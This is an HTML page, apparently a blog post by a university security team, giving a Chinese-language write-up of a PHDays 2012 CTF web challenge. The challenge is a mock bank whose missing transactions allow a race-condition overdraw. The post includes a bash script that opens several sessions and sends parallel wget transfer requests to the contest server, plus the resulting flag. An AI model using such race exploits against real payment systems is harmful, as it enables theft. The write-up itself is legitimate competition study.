@@ -1,0 +1,263 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>PHDay CTF 2012 Quals Real World 200 - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="这个是一个银行，你帐号只有1000块，然后要给别人打钱，要打别人2000快。 问题：竞争，系统没有用事务 恼人的地方：需要用多个不同的session去登录同一个帐号，同一个session登录多次转账没有用，因为每一次请求sessionid会变化，那么第二个请求就成了not authorized. &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/phday-ctf-2012-quals-real-world-200">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">PHDay CTF 2012 Quals Real World 200</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-18T00:00:00+08:00" pubdate data-updated="true">Dec 18<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>这个是一个银行，你帐号只有1000块，然后要给别人打钱，要打别人2000快。</p>
+
+<p>问题：竞争，系统没有用事务</p>
+
+<p>恼人的地方：需要用多个不同的session去登录同一个帐号，同一个session登录多次转账没有用，因为每一次请求sessionid会变化，那么第二个请求就成了not authorized.</p>
+
+<p>脚本：</p>
+
+<pre><code>#!/bin/bash -e
+wget "http://ctf.phdays.com:1629/?act=register" --post-data="login=$1&amp;pass1=$1&amp;pass2=$1&amp;email=123%40123.com" -O /dev/null -q
+wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar --keep-session-cookies  --load-cookies=cookiejar -O /dev/null -q
+wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar2 --keep-session-cookies  --load-cookies=cookiejar2 -O /dev/null -q
+wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar3 --keep-session-cookies  --load-cookies=cookiejar3 -O /dev/null -q
+wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar4 --keep-session-cookies  --load-cookies=cookiejar4 -O /dev/null -q
+wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar5 --keep-session-cookies  --load-cookies=cookiejar5 -O /dev/null -q
+wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar6 --keep-session-cookies  --load-cookies=cookiejar6 -O /dev/null -q
+wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar --save-cookies=cookiejar --keep-session-cookies -O /dev/null -q &amp;
+wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar2 --save-cookies=cookiejar2 --keep-session-cookies -O /dev/null -q &amp;
+wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar3 --save-cookies=cookiejar3 --keep-session-cookies -O /dev/null -q &amp;
+wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar4 --save-cookies=cookiejar4 --keep-session-cookies -O /dev/null -q &amp;
+wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar5 --save-cookies=cookiejar5 --keep-session-cookies -O /dev/null -q &amp;
+wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar6 --save-cookies=cookiejar6 --keep-session-cookies -O /dev/null -q &amp;
+while true; do
+    if ps aux | grep -v grep | grep wget &gt;/dev/null; then
+        sleep 1
+    else
+        wget "http://ctf.phdays.com:1629/?act=main" --load-cookies=cookiejar2 --save-cookies=cookiejar2 --keep-session-cookies -O - -q | html2text -utf8
+        rm cookiejar*
+        exit 0
+    fi
+done
+</code></pre>
+
+<p>运行结果：</p>
+
+<pre><code> PHDays_E-Banking  
+ * Home_Page  
+ * Transactions  
+ * Log_out  
+ * Current balance: 0 Logged in as luketest6 Your flag: e8b434d21354e1a2ab61f4c672109559  
+
+ =============================================================================== © 1.21 GigaWatt, LLC. All Rights Reserved.
+</code></pre>
+
+<p>如果一次没成功，用不同的参数重新运行就好了</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">fqj</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-18T00:00:00+08:00" pubdate data-updated="true">Dec 18<span>th</span>, 2012</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/phday-ctf-2012-quals-real-world-200/" data-via="" data-counturl="http://www.blue-lotus.net/www/phday-ctf-2012-quals-real-world-200/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/phday-ctf-2012-quals-real-world-100/" title="Previous Post: PHDay CTF 2012 Quals Real World 100">&laquo; PHDay CTF 2012 Quals Real World 100</a>
+      
+      
+        <a class="basic-alignment right" href="/hack_u_too-bin50/" title="Next Post: hack_u_too bin500 writeup">hack_u_too bin500 writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
